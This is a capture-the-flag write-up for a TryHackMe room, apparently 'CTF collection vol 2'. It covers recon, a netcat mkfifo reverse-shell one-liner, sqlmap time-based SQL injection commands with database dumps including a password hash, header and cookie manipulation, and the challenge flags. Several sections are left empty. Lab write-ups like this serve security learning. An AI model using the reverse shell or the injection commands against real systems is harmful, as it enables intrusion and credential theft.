## Challenge Name: THM_CTF_VOL



Challenge Description:
Find easter egg!

Artifact Files:


### Approach
## Recon
Using `rustscan`  to scan port on target machine. Those open ports are 22,80.

![img](CTF_img/THM_CTFVOL2/RECON_1.png)
I use ` dirsearch <IP>' to find hidden url of the website have path /buttons, /robots.txt, /login,/static

![img](CTF_img/THM_CTFVOL2/RECON_2.png) and ww see the version of that app using expoit in link below

[exploit_link](https://www.exploit-db.com/exploits/50477)

Acces the webshell and using reverse shell escalation using this `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f` to the web shell

** Easter 1 **

Hint: robots.txt
![img](CTF_img/THM_CTFVOL2/Flg1_1.png)
We have a base64 strings in that robots.txt and follow a buch of hex so we covert first base64 strings to hex format and add up those  follow hex in the robots.txt. Last step convert it to base64 and to text to get the fisrt flag.
![img](CTF_img/THM_CTFVOL2/Flg1_2.png)
Flag is `THM{4u70b07_r0ll_0u7}`

** Easter 2 **

Hint:Decode base64 multiple time

We decode first base64 in robots.txt multiple time and exactly attempts is 1 base64 -> 2 base64 (remove last 2 hex it is '==' in url encode but we can remove it it dont effect the result) -> 3 base64 ( truncate the whitespace) -> 4 base64 (like step 3) -> DesKel_secret_base , and we got the path to the flag ent the paht  <IP>/DesKel_secret_base and inspect the img and we will have the flag.
![img](CTF_img/THM_CTFVOL2/Flg2_1.png)

Flag is ` THM{f4ll3n_b453}`

** Easter 3 **

Hint: Using dirb commonn.txt file
Using 'dirsearch -u <IP> -w /usr/share/dirb/wordlists/common.txt' and we have
![img](CTF_img/THM_CTFVOL2/Flg3_1.png)
inspect the login html and we get a flag
![img](CTF_img/THM_CTFVOL2/Flg3_2.png)
Flag is `THM{y0u_c4n'7_533_m3}`

** Easter 4 **

Hint:sqli time base

Using this cmd `sqlmap -u "http://10.10.13.95/login" \
  --data="username=DesKel&password=anything" \
  -p username --batch --technique=BEUST --time-sec=6 --threads=6 --dbs
` to list databse
```bash
[11:14:04] [INFO] retrieved: 18
[11:14:33] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[11:14:33] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.13.95'

```
we found the THM_f0und_m3 db so we use next `sqlmap -u "http://10.10.13.95/login" \
  --data="username=DesKel&password=anything" \
  -p username --batch --technique=BEUST --time-sec=6 \
  -D THM_f0und_m3 --tables
` to find tables of the db
```bash
[11:28:50] [INFO] retrieved: nothing_inside
[11:29:57] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[11:30:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.13.95'
```
we found collum of that table we use `sqlmap -u "http://10.10.13.95/login" \
  --data="username=DesKel&password=anything" \
  -p username --batch --technique=BEUST --time-sec=6 --threads=6 \
  -D THM_f0und_m3 -T user --columns
` to extract content from that table
```bash
[11:45:38] [INFO] retrieved: password
[11:45:38] [INFO] retrieving the length of query output
[11:45:38] [INFO] retrieved: 11
[11:46:00] [INFO] retrieved: varchar(40)
Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

[11:46:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.13.95'
```

use `qlmap -u "http://10.10.13.95/login" \
  --data="username=DesKel&password=anything" \
  -p username \
  --batch --technique=BEUST --time-sec=6 --threads=6 \
  -D THM_f0und_m3 -T nothing_inside --dump
` to get flag from table nothing here
```bash
[12:08:27] [INFO] retrieving the length of query output
[12:08:27] [INFO] retrieved: 23
[12:09:09] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+

```

Flag is `THM{1nj3c7_l1k3_4_b055}`

** Easter 5 **

so we have structure of `user` table run this `sqlmap -u "http://10.10.13.95/login" \
  --data="username=DesKel&password=anything" \
  -p username \
  --batch --technique=BEUST --time-sec=6 --threads=6 \
  -D THM_f0und_m3 -T user --dump
` to dump all content from that table.
```bash
Database: THM_f0und_m3
Table: user
[2 entries]
+------------------------------------------+----------+
| password                                 | username |
+------------------------------------------+----------+
| 05f3672ba34409136aa71b8d00070d1b (cutie) | DesKel   |
| He is a nice guy, say hello for me       | Skidy    |
+------------------------------------------+----------+
```
Use this credential to acces login and get the flag
![img](CTF_img/THM_CTFVOL2/Flg5_1.png)
Flag is: THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}

** Easter 6 **
Hint : Look out for the response header.
Use this `curl -s -D - -o /dev/null "http://10.10.13.95/` get the header reponse \
```bash
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2025 16:17:25 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Set-Cookie: Invited=0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html

```

Flag is : THM{l37'5_p4r7y_h4rd}

** Easter 7 **


Adjust cookie value to 1 to get the flag in mainpage
![img](CTF_img/THM_CTFVOL2/Flg7_1.png)


** Easter 8 **


We adjust user agent to `Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1` in burpsuit to get the flag
![img](CTF_img/THM_CTFVOL2/Flg8_1.png)


** Easter 9 **

** Easter 10 **

** Easter 11 **

** Easter 12 **

** Easter 13 **

Go to main page and click button and we get the flag
![img](CTF_img/THM_CTFVOL2/Flg13_1.png)
Flag is `THM{1_c4n'7_b3l13v3_17}`

** Easter 14 **

** Easter 15 **

** Easter 16 **

** Easter 17 **

** Easter 18 **

** Easter 19 **

Base on `Easter 3` we saw a small img and have a flag covert it we have the flag `THM{700_5m4ll_3yy}`

![img](CTF_img/THM_CTFVOL2/Flg19_1.png)


** Easter 20 **
